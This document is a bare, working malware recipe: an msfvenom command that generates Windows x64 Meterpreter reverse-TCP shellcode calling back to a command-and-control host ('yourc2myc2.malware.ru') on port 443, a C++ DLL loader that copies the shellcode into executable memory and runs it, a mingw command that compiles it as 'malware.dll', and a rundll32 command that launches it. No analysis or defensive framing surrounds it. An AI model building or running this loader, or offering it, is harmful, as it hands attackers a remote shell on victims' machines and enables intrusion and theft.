msfvenom -a x64 -b '\x00\x0d' -p windows/x64/meterpreter/reverse_tcp LHOST=yourc2myc2.malware.ru LPORT=443 -f c -o out.c

#include<windows.h>

        unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\x4b\xa9\xde\x62\xd4\xc6\x1d\x58\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb7\xe1\x5d\x86\x24\x2e"
        "\xd1\x58\x4b\xa9\x9f\x33\x95\x96\x4f\x09\x1d\xe1\xef\xb0\xb1"
        "\x8e\x96\x0a\x2b\xe1\x55\x30\xcc\x8e\x96\x0a\x6b\xe1\x55\x10"
        "\x84\x8b\x2c\x91\x03\xa6\x69\x28\x9e\x8e\x2c\x98\xe7\x95\xbf"
        "\x1e\xd6\xea\x3d\x19\x8a\x60\xd3\x23\xd5\x07\xff\xb5\x19\xe1"
        "\x55\x30\xf4\x87\x4c\xd3\x09\x95\x96\x63\x04\xa0\x9c\x20\x53"
        "\xa2\xdc\x6d\x51\xb4\x1d\x58\x4b\x22\x5e\xea\xd4\xc6\x1d\x10"
        "\xce\x69\xaa\x05\x9c\xc7\xcd\xd3\x03\xb1\x8e\x26\x5f\x86\x3d"
        "\x11\x4a\x79\x3d\x34\x99\xf7\xd4\x10\xb4\x60\x9f\xe9\xe0\x4e"
        "\x55\x59\x9d\xe1\xef\xa2\x95\x07\xd4\x55\xe7\xe8\xdf\xa3\xec"
        "\x26\x68\xa9\x07\xaa\x92\x46\xdc\x83\x24\x89\x3e\x71\x86\x26"
        "\x5f\x86\x39\x11\x4a\x79\xb8\x23\x5f\xca\x55\x1c\xc0\xe9\xc2"
        "\x2b\xd5\x16\x5c\xd3\x4f\x21\x96\x63\x04\x87\x45\x19\x13\xf7"
        "\x87\x38\x95\x9e\x5c\x01\x0a\xf3\x96\xe1\x38\xe6\x5c\x0a\xb4"
        "\x49\x86\x23\x8d\x9c\x55\xd3\x59\x40\x95\x9d\x2b\x39\x40\x11"
        "\xf5\xde\xad\x50\x8b\xf5\x2f\x58\x4b\xe8\x88\x2b\x5d\x20\x55"
        "\xd9\xa7\x09\xdf\x62\xd4\x8f\x94\xbd\x02\x15\xdc\x62\xd5\x7d"
        "\x94\xd1\xc2\x20\x9f\x36\x9d\x4f\xf9\x14\xc2\x58\x9f\xd8\x98"
        "\xb1\x3b\x5f\xb4\x7c\x92\xeb\x3e\xae\x1c\x59\x4b\xa9\x87\x23"
        "\x6e\xef\x9d\x33\x4b\x56\x0b\x08\xde\x87\x43\x08\x1b\xe4\xef"
        "\xab\x99\xf7\xdd\x10\xb4\x69\x96\xeb\x16\x8e\xe2\x98\x03\x20"
        "\x1f\x23\x6e\x2c\x12\x87\xab\x56\x0b\x2a\x5d\x01\x77\x48\x0a"
        "\xf1\x92\xeb\x36\x8e\x94\xa1\x0a\x13\x47\xc7\xa0\xa7\xe2\x8d"
        "\xce\x69\xaa\x68\x9d\x39\xd3\x2d\xae\x41\x4d\x62\xd4\xc6\x55"
        "\xdb\xa7\xb9\x96\xeb\x36\x8b\x2c\x91\x21\xad\x9f\x3a\x9c\x4f"
        "\xe4\x19\xf1\xab\x07\xaa\x8b\x39\xc8\xdb\xb3\xa9\xa0\x37\x9c"
        "\x45\xd9\x78\x15\x20\x28\x08\x94\x87\x44\x30\x4b\xb9\xde\x62"
        "\x95\x9e\x55\xd1\xb9\xe1\xef\xab\x95\x7c\x45\xfc\x18\x4c\x21"
        "\xb7\x9c\x4f\xde\x11\xc2\x6e\x93\x53\x1d\x8f\x94\xa8\x03\x20"
        "\x04\x2a\x5d\x3f\x5c\xe2\x49\x70\x16\x3d\x2b\x13\x9e\xa0\x4b"
        "\xd4\xf6\x3a\x95\x91\x44\x30\x4b\xe9\xde\x62\x95\x9e\x77\x58"
        "\x11\xe8\x64\x69\xfb\xc9\x2d\xa7\x9e\xfe\x87\x23\x6e\xb3\x73"
        "\x15\x2a\x56\x0b\x2b\x2b\x08\xf4\x64\xb4\x56\x21\x2a\xd5\x05"
        "\x55\x71\x8d\xe1\x5b\x94\xa1\x72\x5c\xa7\xac\xf1\xb4\x62\x8d"
        "\x8f\xda\x9a\xbb\x1c\x7c\x34\x2b\x13\x1d\x58";

extern "C" __declspec(dllexport) void DllEntry(void)
{
        void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcode, sizeof shellcode);
        ((void(*)())exec)();

        // return 0;
}

x86_64-w64-mingw32-gcc -shared -o malware.dll test3.cpp


rundll32 malware.dll,DllEntry
